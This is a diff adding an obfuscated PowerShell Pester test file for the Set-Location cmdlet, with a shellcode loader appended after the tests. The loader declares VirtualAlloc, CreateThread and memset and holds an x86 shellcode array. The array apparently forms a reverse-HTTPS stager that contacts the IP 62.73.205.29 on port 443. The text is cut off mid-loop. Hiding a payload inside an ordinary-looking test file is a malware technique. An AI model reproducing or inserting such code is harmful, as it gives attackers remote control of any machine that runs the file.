@@ -1,0 +1,235 @@
+  ${8b4`pc}=  [TypE]("{0}{2}{3}{1}"-f'sYStE','T','m.eNvir','oNmeN') ;&('sv')  1U7Z  (  [type]("{3}{2}{1}{0}"-F 'h','at','.io.P','SyStEm') );  &("{1}{0}"-f 'ET','s') ("G"+"LU")  (  [type]("{2}{0}{1}" -f'uNSP','aCe','R')  );  ${9`Aj`7D} = [TYPe]("{0}{1}{3}{2}" -f 'SyS','Te','nveRt','m.CO');&("{0}{1}{3}{2}" -f'SEt-','v','ble','Aria') 32FY  ( [tYPE]("{0}{1}{3}{2}" -F'SySTeM.T','e','odING','Xt.ENc') );    &("{1}{0}{2}"-f '-IT','sET','EM') ("VARiAbLe:"+"FIoR"+"w"+"6")  ([tYpe]("{0}{1}" -F'int','ptr')  ) ;  
+
+&("{1}{0}"-f'be','Descri') ("{2}{1}{0}" -f 'cation','-Lo','Set') -Tags "CI" {
+
+    &("{0}{1}{2}"-f'B','eforeAl','l') {
+        ${St`ArtD`ir`E`ctoRy} = &("{0}{1}{2}"-f'Get','-Locatio','n')
+
+        if (${ISwi`N`dOWs})
+        {
+            ${Tar`gET} = "C:\"
+        }
+        else
+        {
+            ${tAR`GEt} = "/"
+        }
+    }
+
+    &("{0}{1}"-f 'After','All') {
+        &("{1}{2}{0}"-f'tion','Set','-Loca') ${S`TAr`TD`iRECt`ORy}
+    }
+
+    &('It') ("{3}{6}{5}{1}{2}{4}{0}" -f'error','ed',' wit','S','hout ','ould be able to be call','h') {
+        { &("{3}{1}{2}{0}" -f'n','c','atio','Set-Lo') ${tA`R`Get} }    | &("{1}{0}" -f'hould','S') -Not -Throw
+    }
+
+    &('It') ("{10}{5}{3}{6}{4}{7}{11}{13}{9}{2}{8}{1}{12}{0}"-f 'viders','ent p','ffe','d b','to ','houl','e able ','be c','r','di','S','alled ','ro','on ') {
+        { &("{1}{0}{2}" -f 'ocatio','Set-L','n') ("{1}{0}" -f's:','alia') } | &("{1}{0}" -f 'uld','Sho') -Not -Throw
+        { &("{0}{2}{1}{3}"-f 'Set-Loca','i','t','on') ("{0}{1}"-f 'e','nv:') }   | &("{0}{1}"-f 'Shoul','d') -Not -Throw
+    }
+
+    &('It') ("{3}{8}{5}{4}{6}{1}{0}{9}{10}{2}{7}{11}{12}" -f ' lo',' the correct current',' set-l','Shou','a','d h','ve','oc','l','cation',' when using the','ati','on cmdlet') {
+        &("{2}{0}{1}" -f'oc','ation','Set-L') ${staRtDIrecT`o`RY}
+
+        $(&("{3}{0}{1}{2}"-f '-Lo','c','ation','Get'))."P`ATH" | &("{1}{2}{0}"-f 'd','Shou','l') -BeExactly ${Sta`RT`DIrECt`orY}."P`ATh"
+    }
+
+    &('It') ("{5}{4}{6}{3}{9}{1}{2}{0}{7}{8}"-f'a','the ','P','t','d be abl','Shoul','e ','th pa','rameter','o use ') {
+        { &("{0}{2}{1}" -f 'S','ocation','et-L') -Path ${tA`Rg`Et} } | &("{0}{1}"-f 'Shoul','d') -Not -Throw
+    }
+
+    &('It') ("{13}{6}{12}{1}{8}{4}{3}{5}{7}{10}{0}{11}{9}{2}" -f'ru ','i','ch','c','bje','t when usi','ner','ng the Pa','nfo o','t','ssth','swi','ate a path','Should ge') {
+        ${ResU`lt} = &("{2}{0}{1}"-f'i','on','Set-Locat') ${taR`get} -PassThru
+        ${RES`U`lt} | &("{1}{0}"-f 'd','Shoul') -BeOfType ("{0}{4}{5}{2}{8}{1}{6}{3}{7}" -f'Sy','nt.Auto','nag','tion.PathInf','stem','.Ma','ma','o','eme')
+    }
+
+    
+    &('It') ("{1}{0}{4}{12}{6}{2}{10}{7}{3}{9}{14}{8}{11}{5}{13}" -f'o','Sh',' path co','n','uld ac','acter','t','tai',' wildc','i','n','ard char','cep','s','ng') -Pending {
+        ${n`UlL} = &("{0}{1}"-f 'New','-Item') -ItemType ("{1}{2}{0}"-f 'y','Di','rector') -Path "$TestDrive\aa"
+        ${nU`lL} = &("{1}{0}{2}" -f 'e','New-It','m') -ItemType ("{1}{0}{2}"-f 't','Direc','ory') -Path "$TestDrive\ba"
+        ${tE`StP`ATH} = &("{2}{0}{1}"-f't','em','New-I') -ItemType ("{0}{2}{1}"-f'Dire','ory','ct') -Path "$TestDrive\[ab]a"
+
+        &("{1}{2}{0}{3}"-f'ca','Set-','Lo','tion') ${tes`TDR`IvE}
+        &("{0}{2}{3}{1}" -f'S','on','et-Loc','ati') -Path ("{0}{1}"-f '[ab]','a')
+        $(&("{2}{3}{1}{0}" -f'tion','-Loca','G','et'))."pA`TH" | &("{1}{2}{0}"-f 'ould','S','h') -BeExactly ${T`E`S`TPath}."F`ULLN`AMe"
+    }
+
+    &('It') ("{4}{8}{6}{1}{0}{7}{3}{10}{5}{2}{9}" -f'lesystem r','e fi','lesyste','der if','S',' fi',' not us','oot fol','hould','m provider',' not in') -Skip:(!${iS`WinDo`wS}) {
+        
+        ${f`OunDfOL`Der} = ${fa`l`SE}
+        foreach (${Fol`der} in &("{0}{1}{2}{3}" -f 'Get-Chi','l','d','Item') "${env:SystemDrive}\" -Directory) {
+            if (-Not (&("{0}{2}{1}"-f 'T','t-Path','es') "HKCU:\$($folder.Name)")) {
+                ${t`eST`FOLdEr} = ${F`O`lder}."n`AMe"
+                ${f`OUn`dfOLDer} = ${T`RUe}
+                break
+            }
+        }
+        ${F`OUNdFOl`DEr} | &("{0}{2}{1}" -f 'S','d','houl') -BeTrue
+        &("{2}{0}{1}" -f 't-Loc','ation','Se') ('HKCU:4iT')."r`EPlAcE"(([ChAR]52+[ChAR]105+[ChAR]84),'\')
+        { &("{0}{1}{2}" -f'Set','-Loc','ation') (  ( &("{1}{0}{2}" -f 'abL','vARi','E') 1u7Z )."v`AlUe"::"di`REcTOr`Y`sEPARAt`OR`ch`AR" + ${tEst`F`OLD`er}) -ErrorAction ("{0}{1}" -f'St','op') } |
+            &("{1}{0}{2}"-f 'ou','Sh','ld') -Throw -ErrorId ("{1}{3}{10}{7}{4}{0}{6}{9}{5}{8}{2}"-f'Commands.','P','d','athNotFound,Microsof','Shell.','LocationCo','Se','r','mman','t','t.Powe')
+    }
+
+    &('It') ("{4}{6}{3}{15}{12}{9}{16}{2}{5}{13}{10}{1}{11}{7}{8}{0}{14}"-f 'ive files','cas','sing of','o','S',' fo','h','insensi','t','use ac','r on ','e-','d ','lde','ystem','ul','tual ca') -Skip:(${i`SLinuX}) {
+        ${TesT`P`Ath} = &("{2}{1}{0}"-f 'em','-It','New') -ItemType ("{2}{0}{1}" -f'ector','y','Dir') -Path ("{3}{1}{2}{0}"-f 'ST','tdrive:','/te','tes')
+        &("{2}{0}{1}" -f'-Loc','ation','Set') ${test`pa`Th}."fUl`ln`AmE".("{0}{2}{1}" -f'T','r','oUppe').Invoke()
+        $(&("{0}{2}{3}{1}" -f 'G','n','et-','Locatio'))."Pa`Th" | &("{1}{0}"-f 'uld','Sho') -BeExactly ${TEst`pAth}."ful`l`Name"
+    }
+
+    &('It') ("{14}{3}{10}{1}{6}{8}{13}{4}{5}{9}{2}{12}{11}{7}{15}{0}"-f'em: <dir>',' actua','fil','uld u',' ','folder on case-sens','l cas','s','i','itive ','se','sy','e','ng of','Sho','t') -Skip:(!${iS`lI`Nux}) {
+        ${d`iR} = ("{1}{0}" -f 'eST','t')
+        ${t`EsTPath`Lo`wEr} = &("{1}{0}" -f 'ew-Item','N') -ItemType ("{2}{0}{1}"-f 'irecto','ry','D') -Path (&("{1}{0}{2}" -f 'o','J','in-Path') ${TE`sT`DrI`VE} ${D`iR}.("{2}{1}{0}"-f'wer','Lo','To').Invoke())
+        ${t`EsT`patHUppEr} = &("{0}{1}{2}"-f 'New-I','t','em') -ItemType ("{3}{1}{2}{0}"-f'y','irect','or','D') -Path (&("{2}{1}{0}" -f'-Path','in','Jo') ${te`stDRI`VE} ${d`IR}.("{1}{0}" -f 'oUpper','T').Invoke())
+        &("{2}{0}{3}{1}" -f '-Lo','n','Set','catio') ${tEstp`ATHLo`WEr}."fUl`LN`AMe"
+        $(&("{1}{3}{2}{0}"-f 'tion','Ge','ca','t-Lo'))."Pa`Th" | &("{1}{0}{2}" -f'hou','S','ld') -BeExactly ${te`sTp`ATHLoW`Er}."FUl`lnaME"
+        &("{2}{0}{1}"-f 'et','-Location','S') ${tE`st`P`AThUpPEr}."f`Ullna`me"
+        $(&("{2}{0}{1}" -f '-','Location','Get'))."pA`Th" | &("{2}{1}{0}"-f 'ld','hou','S') -BeExactly ${t`EstPA`Thu`pPEr}."fU`LLna`Me"
+        { &("{0}{1}{2}"-f'Set-','Locati','on') (&("{1}{2}{0}" -f'n-Path','Jo','i') ${t`esTdR`IVE} ${d`Ir}) -ErrorAction ("{1}{0}" -f'top','S') } | &("{0}{1}" -f 'S','hould') -Throw -ErrorId ("{12}{15}{3}{2}{0}{11}{5}{4}{14}{8}{10}{7}{6}{1}{9}{13}" -f 'owerShel','om','ft.P','croso','C','.','tLocationC','e','mands.','ma','S','l','PathNo','nd','om','tFound,Mi')
+    }
+
+    &("{2}{0}{1}"-f 'onte','xt','C') ("{5}{4}{2}{6}{0}{1}{3}" -f'no',' argumen','on wit','ts','Locati','Set-','h ') {
+
+        &('It') ('Sh'+'ould'+' '+'g'+'o '+'t'+'o '+('{0}en'+'v:'+'H'+'OME ') -F [ChAR]36+'wh'+'en '+'Set'+'-L'+'oca'+'t'+'ion '+'ru'+'n '+'with'+' '+'no'+' '+'arg'+'um'+'ents '+'fr'+'om '+'Fi'+'le'+'System '+'pr'+'ovid'+'er') {
+            &("{1}{0}{2}"-f'-Loc','Set','ation') ((("{0}{2}{1}" -f 'TestD','ve:u14','ri')) -CrePLACE ([cHaR]117+[cHaR]49+[cHaR]52),[cHaR]92)
+            &("{2}{3}{0}{1}"-f 'ocati','on','Set','-L')
+            (&("{1}{0}{2}" -f 'e','G','t-Location'))."pa`TH" | &("{0}{1}" -f'S','hould') -BeExactly (&("{1}{2}{3}{0}"-f'der','G','et-','PSProvi') ("{1}{2}{0}" -f'leSystem','F','i'))."ho`me"
+        }
+
+        &('It') ('S'+'hould'+' '+'go'+' '+'t'+'o '+('SUwe'+'nv:HOME'+' ')."rEP`la`ce"(([cHaR]83+[cHaR]85+[cHaR]119),[StRiNg][cHaR]36)+'when'+' '+'Set'+'-'+'Locati'+'on '+'ru'+'n '+'with'+' '+'no'+' '+'a'+'r'+'guments '+'fr'+'om '+'En'+'v: '+'pr'+'ovider') {
+            &("{2}{1}{0}" -f 'on','et-Locati','S') ("{1}{0}"-f 'nv:','E')
+            &("{0}{3}{2}{1}"-f'Set-','n','catio','Lo')
+            (&("{0}{1}{2}"-f'Get','-Loca','tion'))."pA`Th" | &("{0}{1}" -f 'Sho','uld') -BeExactly (&("{1}{3}{2}{0}" -f'r','Get-','Provide','PS') ("{0}{1}{2}"-f 'Fil','eSyste','m'))."ho`ME"
+        }
+    }
+
+    &('It') ((("{26}{4}{5}{8}{11}{10}{17}{21}{3}{23}{0}{9}{18}{22}{25}{14}{6}{16}{15}{20}{2}{12}{7}{1}{13}{19}{24}{27}" -f 'Xrs current wor','a','erm','ew driv','uld set',' l','a','nated n','ocatio','king','to','n ','i','me of','en p','olon-','th is the c',' ',' ',' a di','t','n','directory','ez','ffere',' wh','Sho','nt drive')) -CRePlACE ([ChAr]122+[ChAr]88+[ChAr]114),[ChAr]39) {
+        try
+        {
+            ${oLD`l`OCAtIOn} = &("{0}{1}{2}"-f 'Get-Locati','o','n')
+            &("{3}{1}{2}{0}" -f 'n','-Locati','o','Set') ((("{2}{3}{1}{0}" -f'hd','ve:Q','Tes','tDri'))  -replAce  ([Char]81+[Char]104+[Char]100),[Char]92)
+            &("{2}{0}{1}" -f 't','em','New-I') -Path ((("{2}{0}{3}{1}"-f'rive','E51','TestD',':'))."rEPL`ACE"(([cHar]69+[cHar]53+[cHar]49),[sTrING][cHar]92)) -Name ("{2}{1}{0}"-f'1','rectory','Di') -ItemType ("{0}{2}{1}{3}" -f 'Dire','to','c','ry')
+            &("{3}{2}{1}{0}" -f 'e','Driv','S','New-P') -Name 'Z' -PSProvider ("{2}{3}{0}{1}" -f'leSyst','em','F','i') -Root ((("{3}{0}{6}{7}{4}{5}{2}{1}" -f'D','1','ctory','Test',':','VkPDire','r','ive')) -rEplACE  ([cHAR]86+[cHAR]107+[cHAR]80),[cHAR]92)
+            &("{0}{1}" -f'New-It','em') -Path 'Z:\' -Name ("{0}{2}{3}{1}"-f 'Dir','2','e','ctory') -ItemType ("{0}{2}{1}" -f 'D','tory','irec')
+
+            &("{3}{0}{1}{2}"-f'-','Locat','ion','Set') ((("{0}{3}{1}{2}"-f'TestDri','rDirect','ory1','ve:u9')) -crEPlacE  'u9r',[chAr]92)
+            ${P`Ath`ToTeSt1} = (&("{3}{2}{1}{0}" -f 'tion','a','et-Loc','G'))."P`ATh"
+            &("{2}{1}{0}"-f 'n','o','Set-Locati') ((("{1}{0}{4}{2}{3}"-f '0','Z:{','Director','y2','}'))-f [ChAR]92)
+            ${P`AtHTO`Tes`T2} = (&("{0}{1}{2}" -f 'G','et-Loc','ation'))."p`AtH"
+
+            &("{1}{2}{0}{3}"-f 'i','Set-Lo','cat','on') ("{0}{2}{1}" -f'T',':','estDrive')
+            (&("{2}{3}{0}{1}"-f '-','Location','Ge','t'))."PA`TH" | &("{0}{1}" -f'S','hould') -BeExactly ${pA`THt`O`TEST1}
+            &("{0}{2}{1}"-f 'S','on','et-Locati') 'Z:'
+            (&("{1}{0}{2}{3}" -f'oc','Get-L','at','ion'))."pA`TH" | &("{0}{1}"-f 'S','hould') -BeExactly ${PaTHt`OTe`S`T2}
+        }
+        finally
+        {
+            &("{2}{1}{0}"-f'Location','t-','Se') ${o`LdlOCA`Ti`On}
+            &("{0}{1}{2}{4}{3}"-f 'Remove-P','S','Dr','e','iv') -Name 'Z'
+        }
+    }
+
+    &("{1}{2}{0}" -f 'xt','Co','nte') ("{2}{8}{6}{4}{5}{7}{3}{0}{10}{9}{11}{1}"-f 'n','y','Set-','o','ith last l','oc',' w','ati','Location','o',' hist','r') {
+
+        &('It') ("{2}{6}{8}{9}{1}{7}{0}{4}{3}{11}{5}{10}" -f'eci','on when','Should go to last l','n','fyi','nus','oc',' sp','at','i',' as a path','g mi') {
+            ${INit`ia`LLo`caTION} = &("{1}{0}{2}" -f 'L','Get-','ocation')
+            &("{3}{2}{1}{0}" -f 'tion','Loca','et-','S') ( (  &("{1}{0}{2}"-f 'AR','v','IABLe')  ('1U7'+'Z')  )."va`LUe"::("{0}{1}{2}"-f'GetTe','m','pPath').Invoke())
+            &("{0}{2}{3}{1}"-f 'Set-Loca','n','ti','o') ('-')
+            (&("{1}{3}{2}{0}" -f'tion','Ge','a','t-Loc'))."pA`Th" | &("{1}{0}"-f'd','Shoul') -Be (${InI`T`iaLLoC`AtioN})."p`Ath"
+        }
+
+        &('It') ("{25}{24}{5}{3}{8}{1}{17}{23}{2}{16}{9}{13}{15}{19}{10}{4}{7}{18}{21}{14}{6}{20}{22}{0}{12}{11}"-f 's as ','location back',' ',' go to la','n','d',' ','u','st ','n specif','i','th','a pa','yi','plus','ng','and back again whe',',','s',' m','and m',', ','inu',' forth','ul','Sho') {
+            ${INIt`i`ALLO`Ca`TI`oN} = (&("{3}{0}{1}{2}" -f'cat','i','on','Get-Lo'))."p`ATH"
+            &("{3}{0}{1}{2}" -f 'L','ocati','on','Set-') ( (  &("{1}{0}"-f 'R','DI')  ('VAr'+'IablE:1u'+'7Z') )."v`AlUe"::("{2}{0}{1}" -f 'empPa','th','GetT').Invoke())
+            ${TEMPp`A`TH} = (&("{1}{0}{2}{3}" -f 't-','Ge','Loc','ation'))."P`ATh"
+            &("{1}{2}{0}{3}"-f 'i','Set-Lo','cat','on') ('-')
+            (&("{2}{1}{0}"-f 'tion','Loca','Get-'))."pA`Th" | &("{0}{1}" -f'Sho','uld') -Be ${i`NItI`A`lLoCA`TIon}
+            &("{0}{3}{1}{2}"-f 'S','t-','Location','e') ('+')
+            (&("{0}{2}{3}{1}" -f'Get','tion','-','Loca'))."p`AtH" | &("{1}{0}" -f'd','Shoul') -Be ${t`eM`PPa`TH}
+            &("{2}{0}{1}{3}" -f'et','-','S','Location') ('-')
+            (&("{2}{0}{1}"-f 'et-','Location','G'))."p`Ath" | &("{1}{0}" -f'hould','S') -Be ${Ini`Tia`ll`OcaTi`On}
+        }
+
+        &('It') ("{9}{4}{5}{8}{2}{6}{10}{0}{7}{1}{11}{3}"-f'hen','y','pr','s twice','ld ','go back to','evi',' specif',' ','Shou','ous locations w','ing minu') {
+            ${iNI`Ti`AllOCaTI`ON} = (&("{0}{2}{1}"-f 'G','on','et-Locati'))."pa`Th"
+            &("{2}{0}{1}"-f'-Lo','cation','Set') ( ( &("{0}{1}{2}"-f 'gE','t-Var','Iable') ("1U7"+"Z") -va)::("{1}{0}{2}{3}" -f'empPa','GetT','t','h').Invoke())
+            ${fIR`STlOcAt`io`NCh`An`Ge} = (&("{0}{2}{3}{1}" -f'Get','ion','-','Locat'))."p`ATH"
+            &("{2}{0}{1}{3}" -f 't-Lo','cat','Se','ion') ( (&("{1}{0}"-f 'm','itE') vaRIABLe:8b4Pc )."va`lUE"::("{1}{0}{2}" -f 'tFolderP','Ge','ath').Invoke(("{1}{0}" -f 'ser','u')))
+            &("{1}{0}{3}{2}" -f 'oca','Set-L','on','ti') ('-')
+            (&("{1}{2}{3}{0}"-f'n','Get-L','ocat','io'))."P`ATH" | &("{0}{1}"-f 'Sh','ould') -Be ${FI`Rst`L`O`caT`i`oNChange}
+            &("{0}{3}{2}{1}" -f'Set-L','ion','t','oca') ('-')
+            (&("{0}{2}{1}"-f 'G','t-Location','e'))."P`Ath" | &("{0}{2}{1}"-f 'Sh','ld','ou') -Be ${INi`T`IaLLOc`At`Ion}
+        }
+
+        &('It') ("{0}{5}{6}{3}{7}{2}{1}{4}"-f'L','is l','istory ','on ','imited','ocat','i','H') {
+            ${INItIAl`lOC`A`T`iON} = (&("{0}{2}{1}"-f 'Get-L','n','ocatio'))."P`AtH"
+            ${m`AximUMl`oCAtIO`N`hi`s`TORy} = 20
+            foreach (${i} in 1..${mAxImUMl`oCA`T`IOnhi`sTOry}) {
+                &("{0}{3}{1}{2}" -f'Set-L','i','on','ocat') (  (  &("{0}{1}" -f 'GC','i') VARiable:1u7Z)."Va`LUE"::("{1}{3}{2}{0}" -f 'empPath','G','T','et').Invoke())
+            }
+            ${TeM`ppa`TH} = (&("{2}{3}{0}{1}"-f 'atio','n','Ge','t-Loc'))."Pa`Th"
+            
+            foreach (${i} in 1..${MAX`iM`UMLoC`A`TioNhi`StORY}) {
+                &("{1}{0}{3}{2}"-f't-L','Se','ion','ocat') ('-')
+            }
+            (&("{3}{2}{0}{1}"-f '-Loca','tion','t','Ge'))."p`AtH" | &("{0}{1}" -f'Sh','ould') ('Be') ${iNItiAlLO`caT`i`oN}
+            { &("{1}{2}{3}{0}" -f 'on','Se','t','-Locati') ('-') } | &("{0}{1}{2}"-f'S','hou','ld') -Throw -ErrorId ("{5}{11}{10}{6}{3}{14}{13}{16}{12}{15}{17}{19}{0}{2}{1}{4}{18}{8}{7}{9}"-f 'erShe','ommand','ll.C','nvalidO','s.','S','em.I','tionC','Loca','ommand','st','y','cept','on','perati','ion,Microso','Ex','f','Set','t.Pow')
+            
+            foreach (${I} in 1..(${Max`i`m`UMlo`CATI`ONh`istORY})) {
+                &("{3}{2}{1}{0}"-f'on','i','at','Set-Loc') ('+')
+            }
+            (&("{3}{0}{1}{2}"-f '-','L','ocation','Get'))."pA`Th" | &("{0}{1}"-f 'Shoul','d') -Be ${TE`MPp`AtH}
+            { &("{1}{3}{0}{2}" -f'Lo','Se','cation','t-') ('+') } | &("{0}{1}" -f 'Sh','ould') -Throw -ErrorId ("{12}{3}{10}{6}{8}{9}{2}{11}{14}{1}{16}{7}{4}{13}{17}{15}{5}{18}{0}" -f 'mmand','.Powe','ti','l','.Command','ationC','Op','hell','erat','ionExcep','id','o','System.Inva','s','n,Microsoft','c','rS','.SetLo','o')
+        }
+    }
+
+    &('It') ((("{2}{5}{12}{4}{3}{1}{10}{8}{9}{11}{7}{6}{0}" -f's','lit','S',' ','ate to','ho','h>qG','h qGs<pat','ra','l p','e','at','uld nativ'))."r`eplAce"(([cHaR]113+[cHaR]71+[cHaR]115),[StriNg][cHaR]34)) -TestCases @(
+        @{ ("{0}{1}" -f'p','ath') = "-" },
+        @{ ("{1}{0}"-f 'ath','p') = "+" }
+    ) {
+        param(${p`ATh})
+
+        &("{1}{3}{2}{0}"-f 'tion','Set-','ca','Lo') ${t`EsTdri`Ve}
+        ${lIT`e`RalPatH} = &("{0}{1}{2}" -f'Joi','n-','Path') ${TEST`d`RIvE} ${pA`TH}
+        &("{0}{1}"-f 'New-I','tem') -ItemType ("{3}{0}{2}{1}" -f 'ir','ry','ecto','D') -Path ${L`it`eRA`LpaTh}
+        &("{0}{2}{3}{1}" -f'Se','ion','t-Lo','cat') -LiteralPath ${Pa`TH}
+        (&("{0}{2}{1}" -f'G','on','et-Locati'))."P`Ath" | &("{0}{2}{1}" -f'Sh','ld','ou') -BeExactly ${Li`T`ErAlPatH}
+    }
+
+    &("{1}{0}{2}"-f'ontex','C','t') ("{7}{9}{2}{3}{1}{6}{0}{10}{8}{4}{5}"-f' eve','ct','Change','dA','e','r','ion','Test the Locatio',' handl','n','nt') {
+
+        &("{0}{1}"-f 'AfterEac','h') {
+            ${E`XEcUTIo`NC`oNTe`xt}."INVoKecomM`A`ND"."lOcAtiOn`Ch`Ang`ed`AC`TiON" = ${nU`lL}
+        }
+
+        &('It') ("{10}{2}{1}{4}{13}{14}{12}{5}{9}{0}{16}{6}{3}{7}{15}{8}{11}{17}" -f 'd',' ','e','when ','L','o',' ','c','g','n shoul','Th',' loc','gedActi','oca','tionChan','hangin',' fire','ation') {
+            ${IN`ITiAlP`A`Th} = ${P`wD}
+            ${O`LdPAtH} = ${n`Ull}
+            ${nEW`paTh} = ${Nu`lL}
+            ${EvENt`s`EsSI`onsTAtE} = ${n`ULl}
+            ${eV`eNT`RU`Ns`paCE} = ${N`Ull}
+            ${exe`c`Utionc`ONtE`xT}."I`NvOKEC`Omm`AnD"."lo`c`AtI`o`NCHANGEdA`CTi`ON" = {
+                (&("{2}{1}{0}"-f 'le','iab','Get-Var') ("{0}{2}{1}" -f 'eventRuns','ace','p'))."V`ALUe" = ${t`hiS}
+                (&("{1}{0}{2}" -f 'bl','Get-Varia','e') ("{0}{4}{2}{3}{1}" -f 'eventSess','e','nSt','at','io'))."VAl`UE" = ${_}."S`essio`Ns`TaTE"
+                (&("{1}{2}{3}{0}" -f 'le','Get','-V','ariab') ("{2}{1}{0}" -f'th','a','oldP'))."V`Alue" = ${_}."O`LdP`Ath"
+                (&("{1}{0}{2}" -f 'et-Variab','G','le') ("{1}{0}{2}"-f'wP','ne','ath'))."va`lUe" = ${_}."neWp`A`Th"
+            }
+            &("{0}{3}{1}{2}"-f 'Se','-Locatio','n','t') ('..')
+            ${nEWP`A`Th}."pA`Th" | &("{0}{1}"-f'Shou','ld') -Be ${p`WD}."pA`Th"
+            ${Ol`dPAth}."P`ATh" | &("{0}{1}" -f'S','hould') -Be ${Init`ial`PatH}."Pa`TH"
+            ${EVE`Nts`e`SSio`NStatE} | &("{1}{0}" -f 'hould','S') -Be ${ExecuT`iOnC`Ont`EXT}."sES`S`ioN`stATE"
+            ${E`V`enTrUN`SPA`cE} | &("{0}{2}{1}" -f'Shou','d','l') -Be (  (  &('gI') ('V'+'aRIaBLE:gL'+'U'))."VA`luE"::"D`EFAuLT`RUns`pA`cE")
+        }
+
+        &('It') ("{16}{11}{4}{3}{19}{18}{14}{10}{5}{2}{0}{20}{12}{1}{13}{15}{9}{8}{7}{6}{21}{17}"-f 'oul',' b','on sh',' in t','s','i','il','a',' f','t','ngedAct','rror','e','ut ','a','no','E',' cd','h','he LocationC','d be catchabl',' the') {
+            ${Lo`C`A`TION} = ${p`wD}
+            &("{0}{2}{3}{1}" -f'S','on','et-','Locati') ('..')
+            ${e`XeCutiO`NC`O`Nt`ExT}."i`N`VoKE`cOMManD"."lo`cAT`Ionch`ANGEdacTION" = { throw ("{0}{1}"-f'Boo','m') }
+            
+            { &("{3}{1}{0}{2}"-f 'c','t-Lo','ation','Se') ${LOCAT`i`on} } | &("{0}{1}" -f 'S','hould') -Throw ("{1}{0}"-f 'oom','B')
+            
+            ${P`wd}."P`ATH" | &("{2}{1}{0}" -f 'ld','u','Sho') -Be ${loca`TiOn}."p`ATh"
+        }
+    }
+}
+
+${1} = '$c = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x6e,0x65,0x74,0x00,0x68,0x77,0x69,0x6e,0x69,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0x31,0xdb,0x53,0x53,0x53,0x53,0x53,0x68,0x3a,0x56,0x79,0xa7,0xff,0xd5,0x53,0x53,0x6a,0x03,0x53,0x53,0x68,0xbb,0x01,0x00,0x00,0xe8,0x1f,0x01,0x00,0x00,0x2f,0x6b,0x67,0x34,0x56,0x6e,0x6a,0x4a,0x62,0x72,0x64,0x51,0x49,0x59,0x77,0x6c,0x69,0x58,0x37,0x6c,0x33,0x52,0x77,0x47,0x75,0x70,0x4d,0x72,0x76,0x34,0x6a,0x4e,0x63,0x6a,0x35,0x45,0x4a,0x6a,0x68,0x44,0x43,0x72,0x4d,0x66,0x66,0x54,0x42,0x63,0x68,0x65,0x73,0x6f,0x77,0x75,0x58,0x75,0x32,0x4f,0x78,0x55,0x6d,0x53,0x50,0x73,0x54,0x48,0x31,0x70,0x4e,0x76,0x44,0x33,0x6f,0x4e,0x55,0x53,0x30,0x59,0x4a,0x58,0x76,0x4b,0x51,0x76,0x4a,0x47,0x58,0x67,0x74,0x49,0x61,0x71,0x4a,0x79,0x6a,0x74,0x39,0x4c,0x70,0x34,0x75,0x75,0x63,0x5f,0x69,0x6b,0x79,0x35,0x69,0x5f,0x48,0x31,0x77,0x79,0x64,0x6f,0x39,0x6c,0x6a,0x41,0x4d,0x48,0x56,0x46,0x59,0x48,0x39,0x70,0x59,0x57,0x77,0x5f,0x44,0x70,0x55,0x4e,0x77,0x65,0x6b,0x41,0x6e,0x7a,0x41,0x70,0x4d,0x2d,0x2d,0x56,0x63,0x45,0x59,0x57,0x67,0x46,0x46,0x00,0x50,0x68,0x57,0x89,0x9f,0xc6,0xff,0xd5,0x89,0xc6,0x53,0x68,0x00,0x32,0xe0,0x84,0x53,0x53,0x53,0x57,0x53,0x56,0x68,0xeb,0x55,0x2e,0x3b,0xff,0xd5,0x96,0x6a,0x0a,0x5f,0x68,0x80,0x33,0x00,0x00,0x89,0xe0,0x6a,0x04,0x50,0x6a,0x1f,0x56,0x68,0x75,0x46,0x9e,0x86,0xff,0xd5,0x53,0x53,0x53,0x53,0x56,0x68,0x2d,0x06,0x18,0x7b,0xff,0xd5,0x85,0xc0,0x75,0x08,0x4f,0x75,0xd9,0xe8,0x49,0x00,0x00,0x00,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x68,0x00,0x00,0x40,0x00,0x53,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x53,0x89,0xe7,0x57,0x68,0x00,0x20,0x00,0x00,0x53,0x56,0x68,0x12,0x96,0x89,0xe2,0xff,0xd5,0x85,0xc0,0x74,0xcf,0x8b,0x07,0x01,0xc3,0x85,0xc0,0x75,0xe5,0x58,0xc3,0x5f,0xe8,0x77,0xff,0xff,0xff,0x36,0x32,0x2e,0x37,0x33,0x2e,0x32,0x30,0x35,0x2e,0x32,0x39,0x00,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;;$size = 0x1000;if ($sc.Length -gt 0x1000){$size = $sc.Length};$x=$w::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), 